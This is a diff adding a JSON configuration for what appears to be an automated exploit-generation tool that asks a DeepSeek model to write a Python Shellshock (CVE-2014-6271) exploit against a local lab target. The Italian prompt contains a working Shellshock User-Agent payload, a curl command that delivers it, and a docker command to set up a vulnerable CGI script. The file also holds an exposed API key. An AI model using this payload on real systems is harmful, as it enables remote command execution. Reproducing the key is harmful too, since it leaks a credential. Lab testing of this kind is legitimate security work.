@@ -1,0 +1,8 @@
+{
+  "cve": "CVE-2014-6271",
+  "target": "http://127.0.0.1:8080",
+  "deepseek_api_key": "sk-9bfc6cae574d4175aecdb52abca10f24",
+  "deepseek_model": "deepseek-chat",
+  "max_iterations": 10,
+  "custom_prompt": "CVE-2014-6271 (Shellshock) \u00e8 una vulnerabilit\u00e0 critica in Bash che permette esecuzione di comandi remoti tramite variabili d'ambiente. Il target \u00e8 un server web Apache con mod_cgi che invoca Bash per eseguire script CGI.\n\nL'exploit deve:\n1. Accettare il target tramite argparse con --target (es. http://127.0.0.1:8080).\n2. Inviare una richiesta HTTP GET ad un endpoint CGI (es. /cgi-bin/test, /cgi-bin/printenv, /cgi-bin/script).\n3. Inserire il payload Shellshock in un header HTTP come User-Agent: () { :; }; /bin/bash -c 'whoami'.\n4. Se la risposta contiene l'output del comando (es. 'www-data', 'root', username), restituire JSON con \"exploit_success\": true e \"evidence\" contenente l'output.\n5. Se riceve 404 o 403, provare con altri endpoint CGI (almeno 3 tentativi).\n6. Gestire timeout (15 secondi), connessioni rifiutate e risposte HTTP non 200.\n7. Se fallisce, restituire \"exploit_success\": false con un messaggio di errore.\n8. Usare requests per le richieste HTTP.\n9. Non includere commenti o spiegazioni nel codice; solo codice Python puro.\n\nPer testare manualmente il target: curl -H \"User-Agent: () { :; }; /bin/bash -c 'whoami'\" http://127.0.0.1:8080/cgi-bin/test\n\nSe l'endpoint non esiste, crearlo nel container con: docker exec -it <container> bash -c \"mkdir -p /usr/lib/cgi-bin && echo -e '#!/bin/bash\\necho \\\"Content-Type: text/plain\\\"\\necho\\nenv' > /usr/lib/cgi-bin/test && chmod +x /usr/lib/cgi-bin/test\""
+}
